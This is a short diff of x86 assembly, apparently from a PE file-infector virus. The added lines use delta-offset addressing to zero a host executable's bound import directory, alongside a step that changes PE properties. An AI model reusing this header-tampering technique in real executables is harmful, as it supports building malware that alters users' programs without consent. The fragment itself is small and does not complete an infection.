@@ -101,6 +101,18 @@ add	edx, 010h
 mov	[edx], ecx
 
 
+; REDUCE BOUND IMPORT DIRECTORY TO ZERO : YOU ARE NOT WELCOLMED HERE !
+mov	ebx, [DELTA PeOptionalHeader]
+add	ebx, 060h ; DataDirectory
+mov	eax, IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT
+mov	ecx, sizeof (IMAGE_DATA_DIRECTORY)
+mul	ecx
+add	ebx, eax
+mov	dword ptr [ebx], 0
+add	ebx, 04h
+mov	dword ptr [ebx], 0
+
+
 ; CHANGE PE PROPERTIES
 mov	eax, [DELTA PeNtHeader]
 add	eax, 01Ch
